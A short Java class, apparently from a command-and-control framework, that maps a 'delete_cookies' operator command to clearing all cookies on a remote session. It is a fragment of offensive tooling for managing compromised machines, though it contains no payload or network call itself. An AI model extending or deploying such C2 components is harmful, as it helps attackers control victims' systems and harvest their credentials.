package c2.session.macro;

import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.win.CookiesCommandHelper;

public class CookieDeletionMacro extends AbstractCommandMacro {

	public static final String DELETE_COOKIES_CMD = "delete_cookies";
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equals(DELETE_COOKIES_CMD);
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		return CookiesCommandHelper.clearAllCookies(io, sessionId);
	}

}
